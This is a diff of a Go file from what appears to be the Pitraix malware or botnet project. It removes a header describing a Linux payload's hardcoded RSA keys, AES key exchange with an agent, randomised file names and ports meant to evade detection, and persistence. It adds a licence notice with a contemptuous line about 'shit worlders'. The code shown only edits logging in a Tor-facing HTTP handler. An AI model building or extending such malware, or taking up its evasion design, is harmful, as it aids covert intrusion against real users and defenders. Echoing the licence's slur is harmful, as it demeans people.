@@ -1,23 +1,13 @@
-/*
-	THIS IS EXPERIEMENTAL PAYLOAD TARGETTING LINUX
+/* 
+	Copyright (C) 2022 @MrCypher16 - All Rights Reserved
+	You may use, distribute and modify this code under the
+	terms of the MIT license. 
+	You should have received a copy of the MIT license with
+	this file. If not, please visit: github.com/ThrillQuks/Pitraix
 
-	- 2 RSA key hardcoded differently for encryption and signature
-	keys are hardcoded into the code it's self and never change, one is responsible for encryption and other for signature verification
-
-	- Generally after registering with agent, the HST would use his AES key for encrypted communications and not RSA
-	
-	- Registering goes like this:
-	HST generates 256-bit-AES key, encrypts it with hardcoded Agent public-key and sends it to Agent/Operative(camaoflagued as an agent)
-	Then HST would only use that AES key for communcations
-
-	- If things could be random, even pesudorandom, lyst would do so. This rule applies to ports, locations, names, length of names of all files Pitraix will drop. To reduce detection rate
-
-	- Pitraix then modifies it's hardcoded agent address with it's own address and persists.
-
-
-	I know this file could be split into a billion file, but for now this works perfect.
-
+	the above notice does not apply to shit worlders
 */
+
 
 package main
 
@@ -2864,15 +2854,18 @@ func main() {
 					// fmt.Println("Got POST request without DataSlice 2! ", dataSlice, len(dataSlice))
 
 				}
+				
 			} else {
-				go log("Foreign - POST", "Received POST request without valid data: " + string(reqBody))
-				fmt.Println("Got POST request without valid data! %v %v\n", reqBody, string(reqBody))
+				go log("Foreign - POST", "Received POST request without valid data")
+				fmt.Println("Got POST request without valid data! %v %v\n", reqBody)
 
 			}	
+
 		} else {
 			fmt.Println("Hello Fake", req.Method)
 
 		}
+
 	})
 	fmt.Println(http.ListenAndServe("127.0.0.1:" + torPort, nil))
 
